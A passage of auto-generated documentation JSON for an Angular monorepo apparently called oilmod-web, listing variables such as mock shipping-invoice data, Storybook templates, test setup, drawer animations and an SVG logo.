          "defaultValue": "[\n  {\n    invoiceNo: 212666588,\n    voyageNo: 16206,\n    vesselName: 'False Cloak Fern',\n    allocated: 486958,\n    total: 367817\n  }, {\n    invoiceNo: 209381561,\n    voyageNo: 16897,\n    vesselName: 'Weak Signalgrass',\n    allocated: 435757,\n    total: 306822\n  }, {\n    invoiceNo: 276445387,\n    voyageNo: 16723,\n    vesselName: 'Southern Red Oak',\n    allocated: 434782,\n    total: 304761\n  }, {\n    invoiceNo: 240525031,\n    voyageNo: 17412,\n    vesselName: 'Hollyleaf Buckthorn',\n    allocated: 498118,\n    total: 518295\n  }, {\n    invoiceNo: 208251845,\n    voyageNo: 15732,\n    vesselName: 'Western Sandparsley',\n    allocated: 483548,\n    total: 409397\n  }, {\n    invoiceNo: 244864110,\n    voyageNo: 15313,\n    vesselName: 'Kern Buckwheat',\n    allocated: 413287,\n    total: 374936\n  }, {\n    invoiceNo: 213639557,\n    voyageNo: 17502,\n    vesselName: 'Greenleaf Manzanita',\n    allocated: 478124,\n    total: 362754\n  }, {\n    invoiceNo: 255930079,\n    voyageNo: 15029,\n    vesselName: 'Blue Skullcap',\n    allocated: 464448,\n    total: 483236\n  }, {\n    invoiceNo: 204028785,\n    voyageNo: 17325,\n    vesselName: 'Coca',\n    allocated: 412084,\n    total: 319574\n  }, {\n    invoiceNo: 215898267,\n    voyageNo: 17556,\n    vesselName: 'Fendler\\'s Pennycress',\n    allocated: 467666,\n    total: 401105\n  }, {\n    invoiceNo: 283652560,\n    voyageNo: 16693,\n    vesselName: 'Densespike Blazing Star',\n    allocated: 428117,\n    total: 422318\n  }, {\n    invoiceNo: 261627486,\n    voyageNo: 16742,\n    vesselName: 'Texas Crab Apple',\n    allocated: 445829,\n    total: 389401\n  }, {\n    invoiceNo: 224657257,\n    voyageNo: 17344,\n    vesselName: 'Philodendron',\n    allocated: 439503,\n    total: 197357\n  }, {\n    invoiceNo: 287799672,\n    voyageNo: 18559,\n    vesselName: 'Knife Acacia',\n    allocated: 457225,\n    total: 152586\n  }, {\n    invoiceNo: 249855102,\n    voyageNo: 17210,\n    vesselName: 'Catnip Noseburn',\n    allocated: 490793,\n    total: 295054\n  }, {\n    invoiceNo: 217932979,\n    voyageNo: 18294,\n    vesselName: 'Brickellbush Goldenweed',\n    allocated: 476987,\n    total: 90357\n  }, {\n    invoiceNo: 287187542,\n    voyageNo: 18123,\n    vesselName: 'Threecornerjack',\n    allocated: 436103,\n    total: 98431\n  }, {\n    invoiceNo: 277359566,\n    voyageNo: 17549,\n    vesselName: 'Longleaf Isodendrion',\n    allocated: 456456,\n    total: 292117\n  }, {\n    invoiceNo: 250935681,\n    voyageNo: 16429,\n    vesselName: 'Purple False Gilyflower',\n    allocated: 465653,\n    total: 396830\n  }, {\n    invoiceNo: 261927204,\n    voyageNo: 16524,\n    vesselName: 'Nevada Pea',\n    allocated: 411190,\n    total: 393332\n  }, {\n    invoiceNo: 203826163,\n    voyageNo: 17608,\n    vesselName: 'Alaska Tall Bluebells',\n    allocated: 487745,\n    total: 273514\n  }, {\n    invoiceNo: 253006185,\n    voyageNo: 17795,\n    vesselName: 'Cupped Monolopia',\n    allocated: 491265,\n    total: 117277\n  }, {\n    invoiceNo: 212369622,\n    voyageNo: 17867,\n    vesselName: 'Small Rocklettuce',\n    allocated: 408880,\n    total: 530690\n  }, {\n    invoiceNo: 259555515,\n    voyageNo: 16488,\n    vesselName: 'Torchwood',\n    allocated: 428843,\n    total: 63208\n  }, {\n    invoiceNo: 209064476,\n    voyageNo: 17957,\n    vesselName: 'Saline Saltbush',\n    allocated: 452602,\n    total: 144560\n  }, {\n    invoiceNo: 246761266,\n    voyageNo: 18253,\n    vesselName: 'White Snakeroot',\n    allocated: 485075,\n    total: 133101\n  }, {\n    invoiceNo: 277989052,\n    voyageNo: 15535,\n    vesselName: 'Bayberry',\n    allocated: 411595,\n    total: 549473\n  }, {\n    invoiceNo: 246327302,\n    voyageNo: 17427,\n    vesselName: 'China Violet',\n    allocated: 426753,\n    total: 406017\n  }, {\n    invoiceNo: 225951335,\n    voyageNo: 15473,\n    vesselName: 'Olympic Saxifrage',\n    allocated: 429650,\n    total: 413380\n  }, {\n    invoiceNo: 206579573,\n    voyageNo: 17600,\n    vesselName: 'False Sun-rose',\n    allocated: 464983,\n    total: 474611\n  }, {\n    invoiceNo: 243806520,\n    voyageNo: 15148,\n    vesselName: 'Bracted Lousewort',\n    allocated: 486907,\n    total: 419416\n  }, {\n    invoiceNo: 248037555,\n    voyageNo: 16554,\n    vesselName: 'Beach Strawberry',\n    allocated: 446762,\n    total: 543982\n  }, {\n    invoiceNo: 233807782,\n    voyageNo: 18251,\n    vesselName: 'Western Bog Yellowcress',\n    allocated: 485749,\n    total: 206612\n  }, {\n    invoiceNo: 231399318,\n    voyageNo: 18647,\n    vesselName: 'Nevada Pea',\n    allocated: 416624,\n    total: 73797\n  }, {\n    invoiceNo: 210265421,\n    voyageNo: 17334,\n    vesselName: 'Silver Bird\\'s-foot Trefoil',\n    allocated: 493556,\n    total: 485404\n  }, {\n    invoiceNo: 270110020,\n    voyageNo: 15750,\n    vesselName: 'Dotted Lancepod',\n    allocated: 439009,\n    total: 85163\n  }, {\n    invoiceNo: 203365491,\n    voyageNo: 15574,\n    vesselName: 'Arizona Whitefeather',\n    allocated: 424981,\n    total: 72976\n  }, {\n    invoiceNo: 258026382,\n    voyageNo: 17991,\n    vesselName: 'Rough Blackfoot',\n    allocated: 412805,\n    total: 525915\n  }, {\n    invoiceNo: 216800989,\n    voyageNo: 18938,\n    vesselName: 'Narrowleaf Wirelettuce',\n    allocated: 437679,\n    total: 384426\n  }, {\n    invoiceNo: 224161270,\n    voyageNo: 15475,\n    vesselName: 'Utah Sweetvetch',\n    allocated: 414735,\n    total: 398700\n  }, {\n    invoiceNo: 224587536,\n    voyageNo: 16133,\n    vesselName: 'Palau Horsfieldia',\n    allocated: 409836,\n    total: 55599\n  }, {\n    invoiceNo: 200019644,\n    voyageNo: 16430,\n    vesselName: 'Cracked Lichen',\n    allocated: 491135,\n    total: 400179\n  }, {\n    invoiceNo: 212973644,\n    voyageNo: 16527,\n    vesselName: 'California Valerian',\n    allocated: 465742,\n    total: 428281\n  }, {\n    invoiceNo: 236726871,\n    voyageNo: 15145,\n    vesselName: 'Spear Saltbush',\n    allocated: 420067,\n    total: 236753\n  }, {\n    invoiceNo: 262498296,\n    voyageNo: 16350,\n    vesselName: 'Rose Globemallow',\n    allocated: 472387,\n    total: 270655\n  }, {\n    invoiceNo: 237959767,\n    voyageNo: 18739,\n    vesselName: 'Cithara Buckwheat',\n    allocated: 447466,\n    total: 358262\n  }, {\n    invoiceNo: 200461954,\n    voyageNo: 18921,\n    vesselName: 'Rough Potato',\n    allocated: 425594,\n    total: 459497\n  }, {\n    invoiceNo: 266033549,\n    voyageNo: 16150,\n    vesselName: 'Distictis',\n    allocated: 447636,\n    total: 286350\n  }, {\n    invoiceNo: 289893009,\n    voyageNo: 18219,\n    vesselName: 'Piedmont False Pimpernel',\n    allocated: 474098,\n    total: 163688\n  }, {\n    invoiceNo: 241320630,\n    voyageNo: 15558,\n    vesselName: 'Southern Mexican Sage',\n    allocated: 431537,\n    total: 419734\n  }, {\n    invoiceNo: 211404482,\n    voyageNo: 18502,\n    vesselName: 'Bearded Sprangletop',\n    allocated: 458939,\n    total: 89714\n  }, {\n    invoiceNo: 247917426,\n    voyageNo: 18238,\n    vesselName: 'Small-flowered Calycadenia',\n    allocated: 406198,\n    total: 351785\n  }, {\n    invoiceNo: 234633032,\n    voyageNo: 17269,\n    vesselName: 'Pritchardia',\n    allocated: 442188,\n    total: 414638\n  }, {\n    invoiceNo: 216477974,\n    voyageNo: 15454,\n    vesselName: 'Thread Lichen',\n    allocated: 474232,\n    total: 537142\n  }, {\n    invoiceNo: 201667786,\n    voyageNo: 15130,\n    vesselName: 'Margined Stickseed',\n    allocated: 493253,\n    total: 364145\n  }, {\n    invoiceNo: 271891491,\n    voyageNo: 15468,\n    vesselName: 'Eggleaf Milkwort',\n    allocated: 457747,\n    total: 316780\n  }, {\n    invoiceNo: 223744528,\n    voyageNo: 16074,\n    vesselName: 'Hall\\'s Mule-ears',\n    allocated: 439241,\n    total: 301239\n  }, {\n    invoiceNo: 202936481,\n    voyageNo: 18868,\n    vesselName: 'Rinodina Lichen',\n    allocated: 488291,\n    total: 504547\n  }, {\n    invoiceNo: 284610720,\n    voyageNo: 17077,\n    vesselName: 'Saber Bogmat',\n    allocated: 417817,\n    total: 246511\n  }, {\n    invoiceNo: 286535852,\n    voyageNo: 15935,\n    vesselName: 'Brodiaea',\n    allocated: 479989,\n    total: 276206\n  }, {\n    invoiceNo: 206000446,\n    voyageNo: 17528,\n    vesselName: 'Utah Serviceberry',\n    allocated: 454837,\n    total: 399887\n  }, {\n    invoiceNo: 283036494,\n    voyageNo: 16899,\n    vesselName: 'Lehua Makanoe',\n    allocated: 452547,\n    total: 96023\n  }, {\n    invoiceNo: 270371913,\n    voyageNo: 16886,\n    vesselName: 'Rim Lichen',\n    allocated: 439082,\n    total: 269557\n  }, {\n    invoiceNo: 273513209,\n    voyageNo: 15570,\n    vesselName: 'Andrews\\' Rhizomnium Moss',\n    allocated: 471494,\n    total: 131750\n  }, {\n    invoiceNo: 215244773,\n    voyageNo: 17618,\n    vesselName: 'Lesser Pond Sedge',\n    allocated: 472422,\n    total: 505921\n  }, {\n    invoiceNo: 264815411,\n    voyageNo: 17008,\n    vesselName: 'Browne\\'s Savory',\n    allocated: 464834,\n    total: 420180\n  }, {\n    invoiceNo: 260793904,\n    voyageNo: 18868,\n    vesselName: 'Bastard Copperleaf',\n    allocated: 403983,\n    total: 190831\n  }, {\n    invoiceNo: 228919503,\n    voyageNo: 16736,\n    vesselName: 'Himalayan Cypress',\n    allocated: 418664,\n    total: 450233\n  }, {\n    invoiceNo: 225534860,\n    voyageNo: 18374,\n    vesselName: 'Fiddleleaf Hawksbeard',\n    allocated: 495477,\n    total: 528500\n  }, {\n    invoiceNo: 205039289,\n    voyageNo: 15221,\n    vesselName: 'Maui Cyanea',\n    allocated: 434081,\n    total: 79021\n  }, {\n    invoiceNo: 219730920,\n    voyageNo: 18931,\n    vesselName: 'Garden Sorrel',\n    allocated: 442584,\n    total: 193166\n  }, {\n    invoiceNo: 229994865,\n    voyageNo: 16404,\n    vesselName: 'Waialeale Dubautia',\n    allocated: 414377,\n    total: 195495\n  }, {\n    invoiceNo: 289807557,\n    voyageNo: 16151,\n    vesselName: 'Onetooth Woodfern',\n    allocated: 415673,\n    total: 202974\n  }, {\n    invoiceNo: 289750833,\n    voyageNo: 15827,\n    vesselName: 'Greenland Orange Lichen',\n    allocated: 416432,\n    total: 146021\n  }, {\n    invoiceNo: 243948439,\n    voyageNo: 18154,\n    vesselName: 'Leafy Reedgrass',\n    allocated: 441439,\n    total: 248631\n  }, {\n    invoiceNo: 266718010,\n    voyageNo: 15322,\n    vesselName: 'Largeleaf Marshpennywort',\n    allocated: 436736,\n    total: 256997\n  }, {\n    invoiceNo: 285338933,\n    voyageNo: 18884,\n    vesselName: 'Musk Okra',\n    allocated: 414918,\n    total: 475276\n  }, {\n    invoiceNo: 284544908,\n    voyageNo: 16825,\n    vesselName: 'Stegonia Moss',\n    allocated: 486396,\n    total: 210718\n  }, {\n    invoiceNo: 200951860,\n    voyageNo: 15681,\n    vesselName: 'Black Rock Townsend Daisy',\n    allocated: 437133,\n    total: 358340\n  }, {\n    invoiceNo: 248838992,\n    voyageNo: 18254,\n    vesselName: 'Kern Canyon Clarkia',\n    allocated: 414245,\n    total: 164454\n  }, {\n    invoiceNo: 274109340,\n    voyageNo: 18252,\n    vesselName: 'Squarrose Knapweed',\n    allocated: 408814,\n    total: 159690\n  }, {\n    invoiceNo: 219721177,\n    voyageNo: 16331,\n    vesselName: 'Lake County Dwarf-flax',\n    allocated: 496150,\n    total: 404922\n  }, {\n    invoiceNo: 272212685,\n    voyageNo: 15395,\n    vesselName: 'Ferngrass',\n    allocated: 432853,\n    total: 191127\n  }, {\n    invoiceNo: 243182762,\n    voyageNo: 18321,\n    vesselName: 'Marsh Grass',\n    allocated: 462472,\n    total: 452940\n  }, {\n    invoiceNo: 277839539,\n    voyageNo: 17421,\n    vesselName: 'Prairie Straw Sedge',\n    allocated: 406837,\n    total: 271284\n  }, {\n    invoiceNo: 207952597,\n    voyageNo: 17197,\n    vesselName: 'Doublehorn Calicoflower',\n    allocated: 477735,\n    total: 400959\n  }, {\n    invoiceNo: 260636315,\n    voyageNo: 15453,\n    vesselName: 'Palmer\\'s Goldenrod',\n    allocated: 450419,\n    total: 309897\n  }, {\n    invoiceNo: 256449906,\n    voyageNo: 15189,\n    vesselName: 'Oregon Checkerbloom',\n    allocated: 435139,\n    total: 139814\n  }, {\n    invoiceNo: 230023430,\n    voyageNo: 15665,\n    vesselName: 'Duckweed',\n    allocated: 449282,\n    total: 209512\n  }, {\n    invoiceNo: 226217229,\n    voyageNo: 18462,\n    vesselName: 'Disc Lichen',\n    allocated: 471214,\n    total: 58962\n  }, {\n    invoiceNo: 239201753,\n    voyageNo: 18676,\n    vesselName: 'Antifever Fontinalis Moss',\n    allocated: 456585,\n    total: 146024\n  }, {\n    invoiceNo: 235303844,\n    voyageNo: 16223,\n    vesselName: 'Miracle Fruit',\n    allocated: 467877,\n    total: 150931\n  }, {\n    invoiceNo: 217943418,\n    voyageNo: 15418,\n    vesselName: 'Little Gumweed',\n    allocated: 494402,\n    total: 355363\n  }, {\n    invoiceNo: 289788898,\n    voyageNo: 15038,\n    vesselName: 'Parish\\'s Oxytheca',\n    allocated: 464853,\n    total: 472823\n  }, {\n    invoiceNo: 280499130,\n    voyageNo: 18914,\n    vesselName: 'Jelly Lichen',\n    allocated: 486477,\n    total: 522679\n  }, {\n    invoiceNo: 223812339,\n    voyageNo: 18298,\n    vesselName: 'Evermann\\'s Fleabane',\n    allocated: 453418,\n    total: 50034\n  }, {\n    invoiceNo: 226331833,\n    voyageNo: 17046,\n    vesselName: 'Munj Sweetcane',\n    allocated: 442239,\n    total: 447072\n  }, {\n    invoiceNo: 226842057,\n    voyageNo: 16491,\n    vesselName: 'Trichostomum Moss',\n    allocated: 450732,\n    total: 471203\n  }, {\n    invoiceNo: 218377093,\n    voyageNo: 18157,\n    vesselName: 'Brown Stringybark',\n    allocated: 441668,\n    total: 464837\n  }, {\n    invoiceNo: 282690677,\n    voyageNo: 16864,\n    vesselName: 'Whorled Milkwort',\n    allocated: 424456,\n    total: 241177\n  } ]"
        }
      ],
      "libs/common/src/test.ts": [
        {
          "name": "context",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/test.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
        },
        {
          "name": "require",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/test.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "any"
        }
      ],
      "libs/core/src/test.ts": [
        {
          "name": "context",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/core/src/test.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
        },
        {
          "name": "require",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/core/src/test.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "any"
        }
      ],
      "libs/error-handler/src/test.ts": [
        {
          "name": "context",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/error-handler/src/test.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
        },
        {
          "name": "require",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/error-handler/src/test.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "any"
        }
      ],
      "libs/datatable/src/test.ts": [
        {
          "name": "context",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/test.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
        },
        {
          "name": "require",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/datatable/src/test.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "any"
        }
      ],
      "libs/form/src/test.ts": [
        {
          "name": "context",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/test.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
        },
        {
          "name": "require",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/test.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "any"
        }
      ],
      "libs/drawer/src/test.ts": [
        {
          "name": "context",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/drawer/src/test.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
        },
        {
          "name": "require",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/drawer/src/test.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "any"
        }
      ],
      "libs/form/src/lib/number-input/value-unit-input.stories.ts": [
        {
          "name": "control",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "new UntypedFormControl({ value: 32.123, unit: 'C' }, Validators.required)"
        },
        {
          "name": "Template",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<>",
          "defaultValue": "(args) => {\n  return {\n    component: NumberUnitInputComponent,\n    props: {\n      ...args,\n      control,\n      change: action('Value changed'),\n    },\n    template: `\n<mat-card class=\"sto-form\" style=\"width: 600px\">\n  <button (click)=\"control.disabled ? control.enable() : control.disable()\">Toggle disabled</button><br>\n    <mat-form-field stoFormField floatLabel=\"always\">\n      <mat-label>{{label}}</mat-label>\n      <sto-number-unit-input (ngModelChange)=\"change($event)\"\n      [fractionSize]=\"fractionSize\"\n      [list]=\"units\"\n      [readonly]=\"readonly\"\n      [formControl]=\"control\"\n      [unitPlaceholder]=\"unitPlaceholder\"\n      [unitClearText]=\"unitClearText\"\n      [unitOptional]=\"unitOptional\"\n      [placeholder]=\"placeholder\">\n      </sto-number-unit-input>\n    </mat-form-field><br>\n    {{control.value | json}}\n  </mat-card>`\n  };\n}"
        },
        {
          "name": "Usage",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "Template.bind({})"
        }
      ],
      "libs/error-handler/src/lib/error-handler/token.ts": [
        {
          "name": "CUSTOM_ERROR_HANDLER",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/error-handler/src/lib/error-handler/token.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "new InjectionToken<ErrorHandler>('sto.custom-error-handler')"
        },
        {
          "name": "ERROR_LOGGER",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/error-handler/src/lib/error-handler/token.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "new InjectionToken<ErrorLogger>('sto.error-logger')"
        }
      ],
      "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.service.ts": [
        {
          "name": "dialogConfig",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.service.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "new MatDialogConfig()"
        }
      ],
      "libs/drawer/src/lib/animation.ts": [
        {
          "name": "drawerAnimations",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/drawer/src/lib/animation.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "[]",
          "defaultValue": "[\n  drawerOpenAnimation,\n  overlayAnimation\n]"
        },
        {
          "name": "drawerOpenAnimation",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/drawer/src/lib/animation.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "trigger('drawerAnimations', [\n  state('open-left', style({ transform: 'translateX(0)', opacity: 1 })),\n  state('open-right', style({ transform: 'translateX(0)', opacity: 1 })),\n  state('openImmediate', style({ transform: 'translateX(0)', opacity: 1 })),\n  state('closedImmediate-left', style({ transform: 'translateX(-100%)', opacity: 0 })),\n  state('closedImmediate-right', style({ transform: 'translateX(100%)', opacity: 0 })),\n  state('closed-left', style({ transform: 'translateX(-100%)', opacity: 0 })),\n  state('closed-right', style({ transform: 'translateX(100%)', opacity: 0 })),\n  transition('open-left => closed-left', [\n    group([\n      animate('400ms ease-in-out', style({ transform: 'translateX(-100%)' })),\n      animate('1ms 400ms ease', style({ opacity: 0 }))\n    ])\n  ]),\n  transition('open-right => closed-right', [\n    group([\n      animate('400ms ease-in-out', style({ transform: 'translateX(100%)' })),\n      animate('1ms 400ms ease', style({ opacity: 0 }))\n    ])\n  ]),\n  transition('* => open-left', [\n    style({ transform: 'translateX(-100%)', opacity: 1 }),\n    animate('400ms ease-in-out')\n  ]),\n  transition('* => open-right', [\n    style({ transform: 'translateX(100%)', opacity: 1 }),\n    animate('400ms ease-in-out')\n  ]),\n])"
        },
        {
          "name": "overlayAnimation",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/drawer/src/lib/animation.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "trigger('overlay', [\n  transition(':enter', [\n    style({ opacity: 0 }),\n    animate('400ms', style({ opacity: 0.08 })),\n  ]),\n  transition(':leave', [\n    animate('400ms', style({ opacity: 0 }))\n  ])\n])"
        }
      ],
      "apps/oilmod-web/src/environments/environment.prod.ts": [
        {
          "name": "environment",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "apps/oilmod-web/src/environments/environment.prod.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "object",
          "defaultValue": "{\n  production: true,\n}"
        }
      ],
      "apps/oilmod-web/src/environments/environment.ts": [
        {
          "name": "environment",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "apps/oilmod-web/src/environments/environment.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "object",
          "defaultValue": "{\n  production: false,\n}"
        }
      ],
      "libs/common/src/lib/sto-filter/filter-panel.stories.ts": [
        {
          "name": "FilterPanel",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "Template.bind({})"
        },
        {
          "name": "Template",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<>",
          "defaultValue": "(args: StoFilterPanelComponent) => {\n  return {\n    component: StoFilterPanelComponent,\n    props: args,\n    template: `\n      <sto-filter-panel class=\"sto-form\"\n                        [expandable]=\"expandable\"\n                        [expanded]=\"expanded\"\n                        (toggled)=\"toggled()\">\n          <sto-filter-title>{{ title }}</sto-filter-title>\n          <sto-filter-table-actions>\n              <button mat-icon-button>\n                  <mat-icon>add</mat-icon>\n              </button>\n          </sto-filter-table-actions>\n          <div class=\"sto-form\"\n               stoGrid>\n              <mat-form-field floatLabel=\"always\"\n              stoFormField\n                              stoGridColumn>\n                  <mat-label>Field 1</mat-label>\n                  <input matInput>\n              </mat-form-field>\n              <mat-form-field floatLabel=\"always\"\n              stoFormField\n                              stoGridColumn>\n                  <mat-label>Field 2 (multi)</mat-label>\n                  <mat-select [multiple]=\"true\">\n                      <mat-option [value]=\"1\">{{1}}</mat-option>\n                      <mat-option [value]=\"2\">{{2}}</mat-option>\n                      <mat-option [value]=\"3\">{{3}}</mat-option>\n                      <mat-option [value]=\"4\">{{4}}</mat-option>\n                  </mat-select>\n              </mat-form-field>\n              <div stoGridColumn\n                   [stoGridColumnDouble]=\"true\"\n                   stoGridSpacer></div>\n          </div>\n      </sto-filter-panel>`\n  };\n}"
        }
      ],
      "apps/oilmod-web-e2e/src/support/app.po.ts": [
        {
          "name": "getGreeting",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "apps/oilmod-web-e2e/src/support/app.po.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "() => cy.get('h1')"
        }
      ],
      "tools/scripts/copy-assets.ts": [
        {
          "name": "glob",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "tools/scripts/copy-assets.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "require('glob')"
        },
        {
          "name": "out",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "tools/scripts/copy-assets.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "path.join(root, 'dist', 'libs', 'core')"
        },
        {
          "name": "root",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "tools/scripts/copy-assets.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "path.join(__dirname, '../../')"
        },
        {
          "name": "scss",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "tools/scripts/copy-assets.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "path.join(src, 'style/**/*')"
        },
        {
          "name": "src",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "tools/scripts/copy-assets.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "path.join(root, 'libs', 'core', 'src')"
        }
      ],
      "libs/common/src/lib/theme/svg-icons.ts": [
        {
          "name": "iconMap",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/theme/svg-icons.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "new Map([\n  [ 'equinor', `<svg width=\"26\" height=\"30\" viewBox=\"0 0 26 30\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n<path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M3.20802 6.37778L3.20825 14.4349C3.20802 14.6738 3.32778 14.8944 3.53463 15.0135L10.5162 19.0356C10.8124 19.2063 11.1901 18.9925 11.1903 18.6506V10.5937C11.1905 10.3548 11.0632 10.1342 10.8561 10.0149L3.87479 5.99297C3.5784 5.82233 3.20847 6.03607 3.20802 6.37778ZM24.7118 0.0862991L14.6605 5.87699C14.3628 6.04851 14.1793 6.36601 14.1797 6.70972V18.3095C14.1802 18.8019 14.7239 19.1094 15.1502 18.8637L25.2017 13.0734C25.4994 12.9017 25.6716 12.5842 25.6711 12.2405L25.6714 0.640639C25.6709 0.148287 25.1383 -0.15921 24.7118 0.0862991ZM10.9237 24.7574L8.13043 26.3669C8.04778 26.4147 7.99668 26.5029 7.99668 26.5984L7.99646 29.8218C7.99646 29.9589 8.14798 30.0442 8.2664 29.976L11.0597 28.3668C11.1425 28.3192 11.1905 28.2308 11.1903 28.1355V24.9116C11.1903 24.775 11.0421 24.6895 10.9237 24.7574ZM9.29577 21.7831L5.11256 19.3625C4.98858 19.2909 4.83572 19.2909 4.71174 19.3625L0.528527 21.7831C0.351005 21.8858 0.351005 22.1419 0.528527 22.2448L4.71174 24.665C4.83572 24.737 4.98858 24.737 5.11256 24.665L9.29577 22.2448C9.47329 22.1419 9.47329 21.8858 9.29577 21.7831ZM16.0303 22.2195L17.889 23.2948C17.999 23.3586 18.1348 23.3586 18.245 23.2948L20.1035 22.2195C20.2613 22.1279 20.2613 21.9002 20.1035 21.8089L18.245 20.7335C18.1348 20.6698 17.999 20.6698 17.889 20.7335L16.0303 21.8089C15.8725 21.9002 15.8725 22.1279 16.0303 22.2195ZM14.5352 24.8077L16.3958 25.8794C16.506 25.943 16.574 26.0607 16.574 26.1881L16.5717 28.3352C16.5715 28.5174 16.3742 28.6314 16.2162 28.5405L14.3557 27.4687C14.2455 27.4052 14.18 27.287 14.18 27.1601L14.1797 25.0129C14.1797 24.831 14.3773 24.7166 14.5352 24.8077Z\" fill=\"#EB0037\"/>\n</svg>` ]\n])"
        }
      ],
      "libs/form/src/lib/sto-option-select-all/sto-option-select-all.stories.ts": [
        {
          "name": "items",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/sto-option-select-all/sto-option-select-all.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "[]",
          "defaultValue": "[\n  {id: 1, name: 'TEST1', longName: 'LONG TEST1'},\n  {id: 2, name: 'TEST2', longName: 'LONG TEST2'},\n  {id: 3, name: 'TEST3', longName: 'LONG TEST3'},\n  {id: 4, name: 'TEST4', longName: 'LONG TEST4'},\n  {id: 5, name: 'TEST5', longName: 'LONG TEST5'},\n  {id: 6, name: 'TEST6', longName: 'LONG TEST6'},\n  {id: 7, name: 'TEST7', longName: 'LONG TEST7'},\n  {id: 8, name: 'TEST8', longName: 'LONG TEST8'},\n  {id: 9, name: 'TEST9', longName: 'LONG TEST9'},\n  {id: 10, name: 'TEST10', longName: 'LONG TEST10'},\n]"
        },
        {
          "name": "SelectAllMulti",
          "ctype": "miscellaneous",
          "subtype": "variable",
